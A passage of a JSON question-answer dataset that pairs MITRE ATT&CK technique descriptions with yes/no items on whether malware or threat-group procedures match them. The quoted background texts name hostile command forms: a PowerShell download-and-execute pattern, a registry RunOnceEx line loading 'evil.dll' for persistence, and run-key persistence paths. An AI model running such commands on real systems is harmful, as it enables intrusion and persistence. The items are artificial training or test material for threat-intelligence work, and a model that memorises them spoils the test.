    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.  related to technique Unsecured Credentials: Credentials in Registry",
    "context": "",
    "output": "No.\nThe correct answer is File and Directory Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.  related to technique Unsecured Credentials: Credentials in Registry",
      "yes/no": "No.\nThe correct answer is File and Directory Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure ZIPLINE can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.  related to technique Impair Defenses: Disable or Modify Tools",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure ZIPLINE can find and append specific files on Ivanti Connect Secure VPNs based upon received commands.  related to technique Impair Defenses: Disable or Modify Tools",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic..\nAnswer in Yes or No.\n\nQuestion: Is procedure Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate. a type of technique Acquire Infrastructure: Domains",
    "context": "",
    "output": "No.\nThe correct answer is Masquerading: Match Legitimate Name or Location",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure Fox Kitten has named binaries and configuration files svhost and dllhost respectively to appear legitimate. a type of technique Acquire Infrastructure: Domains",
      "yes/no": "No.\nThe correct answer is Masquerading: Match Legitimate Name or Location",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.  related to technique Server Software Component: Web Shell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Server Software Component: Web Shell: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
      "question": "Is procedure Tonto Team has used a first stage web shell after compromising a vulnerable Exchange server.  related to technique Server Software Component: Web Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Account Discovery: Domain Account: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups..\nQ: Is procedure Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group. a type of technique Lateral Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Account Discovery: Domain Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Account Discovery: Domain Account: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. PowerShell cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.",
      "question": "Is procedure Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group. a type of technique Lateral Tool Transfer",
      "yes/no": "No.\nThe provided context is correlated with Account Discovery: Domain Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.  related to technique Process Discovery",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
      "question": "Is procedure StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.  related to technique Process Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure BLINDINGCAN has attempted to hide its payload by using legitimate file names such as \"iconcache.db\". a type of technique Masquerading: Match Legitimate Name or Location.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Match Legitimate Name or Location: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "question": "Is procedure BLINDINGCAN has attempted to hide its payload by using legitimate file names such as \"iconcache.db\". a type of technique Masquerading: Match Legitimate Name or Location",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Template Injection: Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.\n\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt..\nQ: Is procedure Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication. a type of technique Template Injection.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Template Injection: Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.\n\nThis technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.",
      "question": "Is procedure Dragonfly has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication. a type of technique Template Injection",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Conti can utilize command line options to allow an attacker control over how it scans and encrypts files.  related to technique Command and Scripting Interpreter: Windows Command Shell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure Conti can utilize command line options to allow an attacker control over how it scans and encrypts files.  related to technique Command and Scripting Interpreter: Windows Command Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions..\nQ: Is procedure RunningRAT captures keystrokes and sends them back to the C2 server. a type of technique Software Discovery.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "question": "Is procedure RunningRAT captures keystrokes and sends them back to the C2 server. a type of technique Software Discovery",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine..\nQ: Is procedure Windshift has used tools to deploy additional payloads to compromised hosts.  related to technique Ingress Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Ingress Tool Transfer: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "question": "Is procedure Windshift has used tools to deploy additional payloads to compromised hosts.  related to technique Ingress Tool Transfer",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File..\nQ: Is procedure Leviathan has sent spearphishing email links attempting to get a user to click.  related to technique Proxy: External Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "question": "Is procedure Leviathan has sent spearphishing email links attempting to get a user to click.  related to technique Proxy: External Proxy",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine..\nAnswer in Yes or No.\n\nQuestion: Is procedure Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.  related to technique System Information Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.  related to technique System Information Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure KONNI has used AES to encrypt C2 traffic. a type of technique Encrypted Channel: Symmetric Cryptography",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Encrypted Channel: Symmetric Cryptography: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "question": "Is procedure KONNI has used AES to encrypt C2 traffic. a type of technique Encrypted Channel: Symmetric Cryptography",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function. a type of technique Data Staged: Local Data Staging",
    "context": "",
    "output": "No.\nThe provided context is related to Input Capture: Keylogging",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "question": "Is procedure Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function. a type of technique Data Staged: Local Data Staging",
      "yes/no": "No.\nThe provided context is related to Input Capture: Keylogging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.  related to technique Develop Capabilities: Malware",
    "context": "",
    "output": "No.\nThe provided context is related to Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "question": "Is procedure BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.  related to technique Develop Capabilities: Malware",
      "yes/no": "No.\nThe provided context is related to Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Kwampirs collects a list of files and directories in C:\\ with the command <code>dir /s /a c:\\ >> \"C:\\windows\\TEMP\\RANDOM.tmp\"</code>. a type of technique File and Directory Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure Kwampirs collects a list of files and directories in C:\\ with the command <code>dir /s /a c:\\ >> \"C:\\windows\\TEMP\\RANDOM.tmp\"</code>. a type of technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure TrickBot uses brute-force attack against RDP with rdpscanDll module.  related to technique Brute Force: Credential Stuffing",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
